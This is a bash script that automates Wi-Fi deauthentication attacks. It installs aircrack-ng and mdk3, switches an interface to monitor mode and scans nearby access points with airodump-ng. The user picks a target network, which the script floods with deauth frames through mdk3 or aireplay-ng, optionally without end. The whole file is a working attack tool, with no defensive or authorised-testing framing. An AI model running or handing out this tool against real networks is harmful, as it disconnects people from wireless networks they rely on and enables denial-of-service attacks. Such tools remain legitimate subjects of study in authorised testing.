#!/bin/bash

# Script to deauth an wireless access point using mdk3 or aireplay-ng.

function line { echo "-----------------------------------------------"; }

function install-xt {
	if [ `which xterm | wc -l` -eq 0 ];then
	   echo -ne "Installing xterm\t"
	   apt-get install -y xterm 1>/dev/null 2>/dev/null
	   if [ $(which xterm | wc -l) -eq 1 ];then
	      echo -e "[ DONE ]"
	   else echo -e "[ FAILED ]"; exit 1
	   fi
	fi
}

function install-ac {
	echo -ne "Installing aircrack-ng\t"
	apt-get install -y aircrack-ng 1>/dev/null 2>/dev/null
	if [ `which aircrack-ng | wc -l` -eq 1 ];then echo "[ SUCCESS ]"; else echo -e "[ FAILED ]\nTry again later. Exiting !!"; exit 1; fi
}

function install-mdk {
	echo -ne "Installing mdk3\t"
	apt-get install -y mdk3 1>/dev/null 2>/dev/null
	if [ `which mdk3 | wc -l` -eq 1 ];then echo "[ SUCCESS ]"; else echo -e "[ FAILED ]\nTry again later. Exiting !!"; exit 1; fi
}

function install-wt {
	echo -ne "Installing wireless-tools\t" 
	apt-get install -y wireless-tools 1>/dev/null 2>/dev/null
	if [ `which iwconfig | wc -l` -eq 1 ];then echo "[ SUCCESS ]"; else echo -e "[ FAILED ]\nTry again later. Exiting !!"; exit 1; fi
}

function obt-iface {
	airmon-ng > $td/am
	head -n -1 $td/am | tail -n +2 > $td/am1
	awk 'NR>=3 {print $0}' $td/am1 > $td/am2
	cut -f2- $td/am2 > $td/am3
	j=`cat $td/am3 | wc -l`
	for ((num=1;num<=j;num++)); do
		echo "$num. `awk -v x=$num 'NR==x {print $0}' $td/am3`"
	done > $td/am4
	line
	echo -e "\tWlan Interface Available"
	line
	echo -e "#  Interface\tDriver\t\tChipset\n"
	cat $td/am4 | tr --squeeze-repeats "\t"
	max_opt=`cat $td/am4 | wc -l`
	if_file=$td/am4
	# if there are more than one monitor mode interface then select only first interface
	if [ `grep "mon" $td/am3 | wc -l` -gt 0 ];then
		x=`grep -n "mon" $td/am3 | head -n1 | tail -n1 | cut -d: -f1`
		miface=`head -n$x $td/am3 | tail -n1 | cut -f1`
	fi
}

function targets {
	clear
	line
	echo -e "\tFollowing Targets were found"
	if [ -e $td/dmp-01.csv ];then
		x=$(grep --line-number -i "station" $td/dmp-01.csv | cut -d ":" -f 1)
		y=$(( x-1 ))
		head -n $y $td/dmp-01.csv 1>$td/dmp.csv
		egrep -o "([A-Z0-9]{2}[\:]){5}[A-Z0-9]{2}" $td/dmp.csv 1>$td/dmp2.csv
		line
		cut -d "," --output-delimiter "  " -f 1,4,9,14 $td/dmp.csv | head -n -1 | tail -n +3 | awk 'BEGIN {OFS="  "} {print NR,"  ", $0}' 1>$td/dmp3.dat
		cut -d "," --output-delimiter "  " -f 14 $td/dmp.csv | head -n -1 | tail -n +3 1>$td/dmpe.dat
		echo -e "#\tBSSID\t\tChannel\tPWR\tESSID\n"
		cat $td/dmp3.dat
		line
	fi
}

function airodmp {
	echo -e "Starting airodump-ng... Please wait..\nYou can press Ctrl+C to stop airodump !"
	sleep 3
	if [ -z "$miface" ];then
		if [ `echo $iface | wc --chars` -gt 6 ];then
			# for system where wlan interface is named something like wlxc4e98415dc54
			# pick the first wlanmon interface for now.
			airmon-ng 1>$td/airm.dat
			x=`grep -n "mon" $td/airm.dat | head -n1 | tail -n1 | cut -d: -f1`
			iface=`head -n$x $td/airm.dat | tail -n1 | cut -f2`
			airodump-ng --output-format csv --write $td/dmp $iface
			export iflag=1
		else airodump-ng --output-format csv --write $td/dmp ${iface}mon; fi
	else
		airodump-ng --output-format csv --write $td/dmp $miface
	fi
	# show targets
	targets
}

function get-iface {
	while read -p "Enter your option (1-$max_opt) : " opt; do
		if [ $opt -gt $max_opt -o $opt -lt 1 ];then echo -e "Invalid input !! Retry"; else break; fi
	done
	export iface=`head -n $opt $if_file | tail -n 1 | awk '{print $2}'`
	line
	# create monitor mode interface
	echo -ne "airmon-ng check kill\t"
	airmon-ng check kill 1>/dev/null
	if [ $? -eq 0 ];then echo "[ DONE ]"; else echo "[ FAILED ]"; fi
	echo -ne "airmon-ng start $iface\t"
	airmon-ng start $iface 2>/dev/null 1>/dev/null
	if [ $? -ne 0 ]; then echo "[ FAILED ]"; exit 1; else echo "[ DONE ]"; fi
	# starting network-manager
	if [ -e /etc/init.d/networking ];then
		echo -ne "Starting /etc/init.d/networking\t"
		/etc/init.d/networking restart 2>/dev/null 1>/dev/null
		echo "[ DONE ]"
	fi
	if [ -e /etc/init.d/network-manager ];then
		echo -ne "Starting /etc/init.d/network-manager\t"
		/etc/init.d/network-manager restart 2>/dev/null 1>/dev/null
		echo "[ DONE ]"
	fi
}

function airmon-stop {
   # stop monitor mode in the end
   airmon-ng stop ${iface}mon 1>/dev/null 2>/dev/null
   airmon-ng stop $iface 1>/dev/null 2>/dev/null
   airmon-ng stop $miface 1>/dev/null 2>/dev/null
}

function mdk3-deauth {
	# choose BSSID
	max_opt=`cat $td/dmp3.dat | wc -l`
	while read -p "Enter the target no. (1-$max_opt) : " bss; do
		if [ $opt -gt $max_opt -o $opt -lt 1 ];then echo -e "Invalid input !! Retry"; else break; fi
	done
	line
	bssid=$(head -n $bss $td/dmp3.dat | tail -n +$bss | awk '{print $2}')
	essid=$(head -n $bss $td/dmpe.dat | tail -n +$bss | cut -d" " -f2)
	echo $bssid > $td/blacklist.txt
	# run mdk3
	echo -e "[ $essid ]\t[ $bssid ]"
	echo "Running mdk3.. You can press Ctrl+C to stop !"
	if [ -z "$miface" ]; then
	   if [ -n "$iflag" ];then
         mdk3 $iface d -b $td/blacklist.txt -c
      else mdk3 ${iface}mon d -b $td/blacklist.txt -c; fi
	else
	   mdk3 $miface d -b $td/blacklist.txt -c
	fi
	airmon-stop
}

function aireplay-deauth {
	# choose BSSID
	max_opt=`cat $td/dmp3.dat | wc -l`
	echo -e "Enter q/Q to Exit"
	while read -p "Enter the target no. (1-$max_opt) : " bss; do
		if [ "$bss" == "q" -o "$bss" == "Q" ];then
			killme=$(pidof `which xterm`)
			if [ -n "$killme" ];then for p in "$killme";do kill -9 $p; done; fi
			exit 1; fi
		if [ $bss -gt $max_opt -o $bss -lt 1 ];then echo -e "Invalid input !! Retry"; else break; fi
	done
	bssid=$(head -n $bss $td/dmp3.dat | tail -n +$bss | awk '{print $2}')
	essid=$(head -n $bss $td/dmpe.dat | tail -n +$bss | cut -d" " -f2)
	ch=$(head -n $bss $td/dmp3.dat | tail -n +$bss | awk '{print $3}')
	read -p "Enter the count (0 for infinite) : " count
	line
	echo -e "[ $essid ]\t[ $bssid ]"
	# run aireplay-ng
	if [ -z "$miface" ]; then
	   if [ -n "$iflag" ];then
         iwconfig $iface channel $ch
         aireplay-ng --deauth $count -a $bssid $iface
      else
         iwconfig ${iface}mon channel $ch
         aireplay-ng --deauth $count -a $bssid ${iface}mon
      fi
	else
	   iwconfig $miface channel $ch
	   if [ `which xterm | wc -l` -eq 0 ];then
		aireplay-ng --deauth $count -a $bssid $miface
	   else
	   	xterm -e aireplay-ng --deauth $count -a $bssid $miface &
	   	aireplay-deauth
	   fi
   fi
   airmon-stop
}

# check for root
if [ "$UID" -ne 0 ];then echo "Please run this script with root privileges !!"; exit 1; fi

# check for packages
if [ `which aireplay-ng | wc -l` -eq 0 ];then install-ac; fi
if [ `which mdk3 | wc -l` -eq 0 ];then install-mdk; fi
if [ `which iwconfig | wc -l` -eq 0 ];then install-wt; fi

# working directory
td="/tmp/deauth/`date +%d%m%y-%H%M%S`"
mkdir -p $td
if [ `which resize | wc -l` -eq 1 ];then resize -s 30 84 2>/dev/null 1>/dev/null; fi
clear

# find wlan interfaces
obt-iface
line
if [ -n "$miface" ];then
	echo -e "Monitor mode found\t[ $miface ]"
	read -p "Do you want to continue with it ? (y/n): " ch
	if [ "$ch" == "y" -o "$ch" == "Y" ];then airodmp
	else
		# stop the monitor mode
		echo -ne "airmon-ng stop $miface\t"
		airmon-ng stop $miface 1>/dev/null 2>/dev/null
		if [ $? -eq 0 ];then echo "[ DONE ]"; else echo "[ FAILED ]"; fi
		obt-iface
		line
		get-iface
		airodmp
	fi
else
	get-iface
	airodmp
fi

# deauth method
echo -e "\tDeauth Tools available\n1. mdk3\t\t\t2. aireplay"
line
while read -p "Enter your option (1-2) : " opt; do
	if [ $opt -gt 2 -o $opt -lt 1 ];then echo "Invalid input !! Retry"; else break; fi
done
line
if [ $opt -eq 1 ];then mdk3-deauth; fi
if [ $opt -eq 2 ];then aireplay-deauth; fi
